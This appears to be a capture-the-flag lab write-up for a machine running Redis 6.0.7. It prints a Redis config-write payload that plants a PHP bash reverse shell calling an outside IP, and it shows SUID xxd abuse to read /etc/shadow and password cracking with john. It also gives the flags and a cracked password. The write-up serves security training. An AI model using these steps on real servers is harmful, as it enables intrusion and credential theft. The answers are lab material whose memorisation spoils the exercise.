### Scan the machine, how many ports are open?
```BASH
sudo nmap -sV -p- $ip
```
![alt text](image.png)

<pre>2</pre>

<span style="line-height:0.5;">&nbsp;</span>

### What's is the database management system installed on the server?
<pre>redis</pre>

<span style="line-height:0.5;">&nbsp;</span>

### What port is the database management system running on?
<pre>6379</pre>

<span style="line-height:0.5;">&nbsp;</span>

### What's is the version of management system installed on the server?
<pre>6.0.7</pre>

<span style="line-height:0.5;">&nbsp;</span>

### Compromise the machine and locate user.txt
Tried to:
```BASH
redis-cli -h 10.10.96.238 6379
```
![alt text](image-1.png)

You can connect to the Redis server and Lua scripting is allowed, but it's sandboxed so you can't run system commands.

Start netcat listener:
```BASH
nc -lvnp 4444
```

Write this in redis console:
```BASH
flushall
set x "<?php exec('/bin/bash -c \"bash -i >& /dev/tcp/10.10.220.167/4444 0>&1\"'); ?>"
config set dir /var/www/html/
config set dbfilename shell.php
save
```

Once you hit save, you have access to reverse shell
![alt text](image-4.png)

Spawn a TTY shell:
```BASH
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Look for user flag by using grep:
```BASH
grep -r --include="user.txt" . /home 2>/dev/null
```
![alt text](image-7.png)

<pre>thm{red1s_rce_w1thout_credent1als}</pre>

<span style="line-height:0.5;">&nbsp;</span>

### What is the local user account password?
From the prevous grep you know that local user is vianka, but don't know her password. Look at all SUID binaries:
```BASH
find / -perm -4000 -type f 2>/dev/null
```
![alt text](image-6.png)

The exploitable SUID binary is `/usr/bin/xxd`. Go to [GTFObins](https://gtfobins.github.io/#) and search for xxd. In linux systems user's password are stored in `/etc/shadow`.

```BASH
LFILE=/etc/shadow
sudo xxd "$LFILE" | xxd -r
```
![alt text](image-8.png)

Run john to crack hash:
```BASH
/usr/sbin/john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```
![alt text](image-9.png)

<pre>beautiful1</pre>

<span style="line-height:0.5;">&nbsp;</span>

### Escalate privileges and obtain root.txt
Check vianka priviligies:
```BASH
sudo -l
```
![alt text](image-10.png)  

Shows that vianka has full sudo access without restriction.

Get root and read root flag:
```BASH
sudo su -
cd /root
cat root.txt
```
![alt text](image-11.png)

<pre>thm{xxd_pr1v_escalat1on}</pre>

<span style="line-height:0.5;">&nbsp;</span>